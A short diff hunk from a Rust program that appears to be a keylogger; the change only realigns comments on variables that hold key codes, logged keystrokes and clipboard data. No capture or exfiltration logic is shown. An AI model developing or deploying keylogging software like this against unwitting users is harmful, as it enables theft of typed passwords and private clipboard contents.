@@ -106,9 +106,9 @@ fn main() {
     return;
   }
 
-  let keys = KbKeys::new();                         // Creates the structure that stores the virtual key codes.
-  let mut buffer = "".to_owned();                   // The buffer that holds the data to be logged.
-  let mut clip_buffer = "".to_owned();              // Buffer holds data from the clipboard.
+  let keys = KbKeys::new();                                 // Creates the structure that stores the virtual key codes.
+  let mut buffer = "".to_owned();                           // The buffer that holds the data to be logged.
+  let mut clip_buffer = "".to_owned();                      // Buffer holds data from the clipboard.
   let mut write_counter: u32 = 0;                           // Tells us how long until the buffer is emptied.
   let mut c_pos: usize = 0;                                 // Tells us where the user is typing on a line.
 
